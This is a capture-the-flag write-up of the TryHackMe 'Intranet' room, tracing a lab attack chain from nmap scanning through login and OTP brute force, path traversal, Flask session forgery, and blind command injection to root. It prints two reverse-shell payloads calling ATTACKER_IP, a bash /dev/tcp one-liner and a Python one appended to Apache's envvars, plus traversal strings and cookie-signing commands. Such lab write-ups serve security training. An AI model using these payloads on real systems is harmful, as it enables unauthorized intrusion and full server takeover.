# CTF-Writeups
# ğŸ§  TryHackMe â€“ Intranet Room Writeup
Detailed TryHackMe Intranet room writeup covering web exploitation, Flask session hijacking, command injection, and Linux privilege escalation.
Disclaimer:
This writeup is for educational purposes only.
The target machine is hosted on TryHackMe and was attacked with proper authorization.

ğŸ” Reconnaissance
We start with an Nmap scan to identify open ports and running services.

# nmap -sT -sV -sC 10.81.166.57

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-06 13:27 PKT
Nmap scan report for 10.81.166.57
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
7/tcp    open  echo
21/tcp   open  ftp        vsftpd 3.0.5
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ec:e2:bf:8e:dc:d8:c7:bb:c6:74:51:dd:ed:75:a8:d9 (RSA)
|   256 f0:f9:44:15:58:7d:ef:7a:db:b8:78:11:f8:02:86:e6 (ECDSA)
|_  256 e7:01:7d:f2:26:ab:c0:fe:cb:3b:cc:29:35:10:44:64 (ED25519)
23/tcp   open  tcpwrapped
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http-proxy Werkzeug/2.2.2 Python/3.8.10
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login

ğŸŒ Web Enumeration
Two web servers were discovered:

Port 80 â€“ Apache
Port 8080 â€“ Flask application (Login page)

ğŸ‘¤ Credential Discovery
From the HTML source code of the login page, the following potential usernames were found:
devops@securesolacoders.no
anders@securesolacoders.no

ğŸ“– Wordlist Generation
Using CeWL to generate a password wordlist:
# cewl http://10.81.166.57:8080/login -w cewl.txt
The generated list was too small, so it was expanded using WeakPass PassGen to generate weak password combinations.

ğŸ”‘ Login Bruteforce
Using ffuf, the login page was brute-forced and valid credentials were found:

Password: securesolacoders2022
ğŸ Flag 1
THM{3d60bb52**************}

ğŸ”¢ OTP Bruteforce
After login, an OTP verification was required.
Generate numeric OTP list:
# seq -w 9999 > num.txt
Bruteforce OTP using ffuf:
# ffuf -w num.txt -request OTP.req -request-proto http -fl 78
ğŸ Flag 2
THM{98aa3c0c**************}



ğŸ“‚ Path Traversal Vulnerability
# The news parameter was vulnerable to path traversal.

news=../../../..//etc/passwd

# Further enumeration allowed access to Python source files:

/../../../proc/self/cmdline
/../../../home/devops/app.py
ğŸ Flag 3
THM{4ccacfd7**************}



ğŸ§ª Source Code Review
From app.py, the following insecure code was identified:

# os.system(request.form["debug"])

This allows OS command execution.

ğŸ” Flask Secret Key Bruteforce
The Flask secret key format was discovered:

#key = "secret_key_" + str(random.randrange(100000,999999))
Generate key list:

# sed -i 's/^/secret_key_/g' num.txt
Bruteforce secret using flask-unsign:

# flask-unsign -w num.txt --cookie "<cookie>" --unsign

Sign admin session:

# flask-unsign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret_key_987554' --sign
Replace session cookie in intercepted request.

# Intercep admin request and change session cookie and forwerd request
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.aV91WA.WKJaLp4Vj6fCfv4_VI3NMs00Hqk

ğŸ‘‘ Admin Access

Admin access was successfully obtained.

ğŸ Flag 4
THM{4f3f2ebe**************}



ğŸ’¥ Command Injection (Blind)
The command execution was blind. Verification was done using ping and tcpdump.
ğŸš Reverse Shell
# /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1'

ğŸ Flag 5
THM{79445fbd**************}


â¬†ï¸ Shell Upgrade & File Write
Apache was running as anders
Write access to /var/www/html ! Upload pentestmonkey reverse shell  and we got anders shell
# https://github.com/pentestmonkey/unix-privesc-check

ğŸ Flag 6
THM{5c8f3b3b**************}



ğŸš€ Privilege Escalation (Root)
Check sudo permissions:

# sudo -l
User anders can restart Apache without password:

(ALL) NOPASSWD: /sbin/service apache2 restart

Append reverse shell payload to Apache envvars:

echo "/usr/bin/python3 -c 'import socket,os,pty;
s=socket.socket();
s.connect((\"ATTACKER_IP\",445));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn(\"/bin/sh\")'" >> /envvars


Restart Apache:

# sudo /sbin/service apache2 restart

ğŸ† Root Access
ğŸ Flag 7
THM{6cc71ed8**************}



âœ… Conclusion
This room demonstrated:
Web enumeration
Bruteforce attacks
Path traversal
Flask session hijacking
Command injection
Linux privilege escalation
A complete real-world style attack chain from recon to root.





